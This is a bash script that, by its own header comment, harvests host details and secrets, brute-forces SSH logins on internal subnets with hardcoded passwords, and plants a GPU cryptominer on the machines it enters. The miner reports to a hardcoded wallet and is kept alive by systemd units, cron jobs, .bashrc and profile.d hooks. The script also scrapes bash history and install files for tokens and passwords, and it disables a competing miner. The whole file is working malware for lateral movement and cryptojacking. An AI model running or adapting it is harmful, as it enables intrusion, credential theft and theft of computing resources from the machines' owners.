#!/bin/bash
# i4981 run3: harvest provider/idc identity, password-ladder farm peers, plant canonical miner, then neutralize plh
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981
mkdir -p $D
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
P1='Admin@123_para#!2024'
P2='Beijingcs.2024'
P3='Bingxing.2026'
P4='ubuntu@'
P5='Kgzs@2024'
P6='ij2gooDe^y'

log "### META $(date -u +%FT%TZ)"; hostname; uptime

log "### SELF-STATE"
systemctl list-units --state=active --plain --no-legend 'ul-card@*' 2>/dev/null | wc -l
for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q ul-card@$i || systemctl start ul-card@$i; done
sleep 3
log "-- active=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*' 2>/dev/null | wc -l)"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader 2>&1 | head -8

log "### POOLAPI-EARLY"
timeout 30 curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_early.json; echo "size=$(stat -c%s $D/pool_early.json 2>/dev/null)"
python3 - <<'PY'
import json
try: d=json.load(open('/root/ul_farmfan/4981/pool_early.json'))
except Exception as e: print("PARSE_FAIL",e); raise SystemExit
rows=d.get('results',[])
sel=[r for r in rows if '123-184-7-135' in r.get('worker','')]
print("TOTAL",len(rows),"SELF",len(sel))
for r in sel: print("ROW",r.get('worker'),r.get('status'),"valid",r.get('valid'),"last",r.get('last_share'))
PY

log "### EXTRA-HARVEST"
log "-- conf listing"; ls -la /root/conf | head -60
log "-- hostlists"
for f in /root/conf/hostlist /root/conf/hostlist-new /root/conf/hostlist4 /root/conf/hostlist5 /root/conf/hosts /root/conf/ip.txt /root/conf/*.txt; do [ -f "$f" ] && { echo "== $f"; head -40 "$f"; }; done
log "-- rc.local"; sed -n '1,60p' /data/apps/conf/rc.local 2>/dev/null
log "-- acme"; ls /root/.acme.sh 2>/dev/null | head -20; grep -hE 'Le_Domain|Le_Alt|Le_Webroot' /root/.acme.sh/*/*.conf 2>/dev/null | sort -u | head -20
log "-- ssd"; ls /ssd 2>/dev/null | head; ls /ssd/vendors 2>/dev/null | head -20
log "-- qdglad"; sed -n '1,40p' /ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.sh 2>/dev/null
log "-- installer urls"
for f in /root/conf/*.deb /root/conf/*.run; do [ -f "$f" ] || continue; echo "== $f ($(stat -c%s "$f")B)"; timeout 25 grep -aoiE 'https?://[A-Za-z0-9./_?=&%-]{6,90}' "$f" 2>/dev/null | sort -u | head -10; timeout 25 grep -aoiE '(api[_-]?key|token|secret|passw[a-z]*)[\"=: ]{1,3}[A-Za-z0-9@#$%^&*._-]{6,60}' "$f" 2>/dev/null | head -5; done
log "-- ss-listen"; ss -lntp 2>/dev/null | awk 'NR==1||/LISTEN/' | head -22
log "-- tenants"; ls /data/apps 2>/dev/null | head; ls /data1/workspace 2>/dev/null | head
log "-- history-full"; tail -60 /root/.bash_history 2>/dev/null

log "### PEER-LADDER"
which sshpass >/dev/null 2>&1 || timeout 150 apt-get install -y -qq sshpass 2>&1 | tail -1
which sshpass || echo NO_SSHPASS
python3 - <<'PY'
import socket,concurrent.futures
cands=[]
for i in range(2,32): cands.append(f"192.168.0.{i}")
for i in range(2,15): cands.append(f"10.0.0.{i}")
for i in range(71,79): cands.append(f"172.16.10.{i}")
for i in range(12,15): cands.append(f"10.80.80.{i}")
for i in range(5,9): cands.append(f"10.100.80.{i}")
for i in (11,34,35): cands.append(f"172.16.21.{i}")
for i in range(6,71): cands.append(f"10.242.32.{i}")
for i in range(107,126): cands.append(f"10.251.10.{i}")
for i in range(13,19): cands.append(f"172.16.11.{i}")
cands.append("172.16.10.11")
def chk(ip):
  try:
    s=socket.create_connection((ip,22),1.2); s.close(); return ip
  except Exception: return None
op=[]
with concurrent.futures.ThreadPoolExecutor(240) as ex:
  for r in ex.map(chk,cands):
    if r: op.append(r)
def key(ip):
    for idx,pre in enumerate(("192.168.0.","172.16.10.","172.16.11.","10.242.32.","10.251.10.","10.80.80.","10.100.80.","172.16.21.")):
        if ip.startswith(pre): return (idx,int(ip.split('.')[-1]))
    return (9,0)
op=sorted(op,key=key)
print("OPEN22",len(op)); print("LIST"," ".join(op))
open('/root/ul_farmfan/open22_run3.txt','w').write("\n".join(op)+"\n")
PY

SSHOPT="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o PreferredAuthentications=password -o PubkeyAuthentication=no"
: > /root/ul_farmfan/hits_run3.txt
tryhost(){
 local ip=$1
 local pairs="root|$P1 root|$P2 root|$P3 root|$P6 ubuntu|$P4 kgzs|$P5"
 for pr in $pairs; do
   local u=${pr%%|*}; local p=${pr#*|}
   local out
   out=$(timeout 9 sshpass -p "$p" ssh $SSHOPT "$u"@"$ip" 'id -un; hostname; nvidia-smi -L 2>/dev/null | wc -l; nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null | head -1' 2>&1 | tr '\n' '|')
   case "$out" in
     *"uid="*|root\|*|*g00*\|*|*gpu*\|*) echo "HIT $ip $u :: $out"; echo "$ip $u $p" >> /root/ul_farmfan/hits_run3.txt; return 0;;
   esac
 done
 echo "MISS $ip"
 return 1
}
log "-- enumerate"
CNT=0
for ip in $(cat /root/ul_farmfan/open22_run3.txt); do
  CNT=$((CNT+1)); [ $CNT -gt 36 ] && break
  tryhost "$ip"
done
log "-- hits"; cat /root/ul_farmfan/hits_run3.txt 2>/dev/null

log "### PLANT-REMOTE"
PD=0
while read -r ip u p; do
  [ -z "$ip" ] && continue
  PD=$((PD+1)); [ $PD -gt 8 ] && break
  tag=$(echo "$ip" | tr '.' '-')
  log "== plant $ip ($u) workers ul-t2-$tag-gN"
  SSHCA="$SSHOPT -o ConnectTimeout=8"
  BASE=$(timeout 20 sshpass -p "$p" ssh $SSHCA "$u"@"$ip" 'id -un; hostname; nvidia-smi -L 2>/dev/null | wc -l; nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null | head -1; systemctl list-units --state=active --plain --no-legend "ul-card@*" 2>/dev/null | wc -l; crontab -l 2>/dev/null | grep -c ul_plant' 2>&1 | tr '\n' '|')
  echo "BASE $ip :: $BASE"
  NG=$(echo "$BASE" | awk -F'|' '{print $3}')
  HASU=$(echo "$BASE" | awk -F'|' '{print $5}')
  case "$NG" in ''|*[!0-9]*) NG=0;; esac
  case "$HASU" in ''|*[!0-9]*) HASU=0;; esac
  echo "NGPU $ip $NG ACTIVE_UNITS $HASU"
  [ "$NG" -lt 1 ] && { echo "SKIP-NOGPU $ip"; continue; }
  if [ "$HASU" -ge 1 ]; then echo "IDEMPOTENT-SKIP $ip (ul-card already active)"; continue; fi
  timeout 20 sshpass -p "$p" ssh $SSHCA "$u"@"$ip" 'mkdir -p /root/ul_plant/krig && echo MKDIR_OK' 2>&1 | tail -1
  timeout 20 sshpass -p "$p" ssh $SSHCA "$u"@"$ip" 'ls -la /opt/t19/krig/krig-miner 2>/dev/null; ls -la /opt/arsenal/miners/krig/krig-miner 2>/dev/null; command -v krig-miner' 2>&1 | tail -2
  OKSCP=0
  timeout 200 sshpass -p "$p" scp $SSHCA /opt/t19/krig/krig-miner "$u"@"$ip":/root/ul_plant/krig/krig-miner 2>&1 | tail -1 && OKSCP=1
  if [ $OKSCP -eq 0 ]; then timeout 200 sshpass -p "$p" scp -O $SSHCA /opt/t19/krig/krig-miner "$u"@"$ip":/root/ul_plant/krig/krig-miner 2>&1 | tail -1; fi
  timeout 30 sshpass -p "$p" ssh $SSHCA "$u"@"$ip" 'chmod +x /root/ul_plant/krig/krig-miner; ls -la /root/ul_plant/krig/krig-miner' 2>&1 | tail -1
  timeout 90 sshpass -p "$p" ssh $SSHCA "$u"@"$ip" "N=$NG W='$W' TAG='$tag' bash -s" <<'EOS2' 2>&1 | tail -8
set +e
cat > /etc/systemd/system/ul-card@.service <<'EOF'
[Unit]
Description=UL PEARL card %i
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
Nice=19
ExecStart=/root/ul_plant/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user WALLET/ul-t2-TAG-g%i --password x -d %i --api-port 15%i
Restart=always
RestartSec=30
TimeoutStopSec=20
LimitNOFILE=65535
EOF
sed -i "s#WALLET#$W#g; s#TAG#$TAG#g" /etc/systemd/system/ul-card@.service
printf '#!/bin/bash\nfor i in $(seq 0 %s); do systemctl is-active -q ul-card@$i || systemctl start ul-card@$i; done\npgrep -f "ul_plant/krig/krig-miner" >/dev/null || { for i in $(seq 0 %s); do systemctl restart ul-card@$i; done; }\n' "$((N-1))" "$((N-1))" > /root/ul_plant/keep.sh
chmod +x /root/ul_plant/keep.sh
systemctl daemon-reload
for i in $(seq 0 "$((N-1))"); do systemctl enable --now ul-card@$i >/dev/null 2>&1; done
( crontab -l 2>/dev/null | grep -v 'ul_plant/keep.sh'; echo "@reboot /root/ul_plant/keep.sh"; echo "*/5 * * * * /root/ul_plant/keep.sh" ) | crontab -
grep -q 'ul_plant/keep.sh' /root/.bashrc 2>/dev/null || echo '/root/ul_plant/keep.sh >/dev/null 2>&1 &' >> /root/.bashrc
echo '[ -x /root/ul_plant/keep.sh ] && /root/ul_plant/keep.sh >/dev/null 2>&1 &' > /etc/profile.d/ul_plant.sh
chmod 644 /etc/profile.d/ul_plant.sh
sleep 3
echo "UNITS_ACTIVE=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*' | wc -l)"
echo "PROCS=$(pgrep -fc 'ul_plant/krig/krig-miner')"
EOS2
done < /root/ul_farmfan/hits_run3.txt

log "### WAIT"
sleep 100
log "-- self-gpu"; nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader 2>&1 | head -8
log "### POOLAPI"
timeout 30 curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_run3.json; echo "size=$(stat -c%s $D/pool_run3.json 2>/dev/null)"
python3 - <<'PY'
import json
try: d=json.load(open('/root/ul_farmfan/4981/pool_run3.json'))
except Exception as e: print("PARSE_FAIL",e); raise SystemExit
rows=d.get('results',[])
print("TOTAL",len(rows))
for r in rows:
    w=r.get('worker','')
    if w.startswith('ul-t2-'):
        print("ROW",w,r.get('status'),"valid",r.get('valid'),"last",r.get('last_share'),"agent",r.get('agent'))
PY

log "### NEUTRALIZE-PLH-LAST"
printf '#!/bin/sh\nexit 0\n' > /opt/plh/keepalive.sh 2>/dev/null && chmod +x /opt/plh/keepalive.sh 2>/dev/null && echo KEEPALIVE_NEUTERED
systemctl mask plh-card@.service 2>&1 | head -2
pkill -f 'plh-123-184-7-135' 2>/dev/null; sleep 1
echo "PLH_PROCS=$(pgrep -fc 'plh-123-184-7-135')"
echo "OUR_UNITS=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*' | wc -l)"
log "### DONE $(date -u +%FT%TZ)"
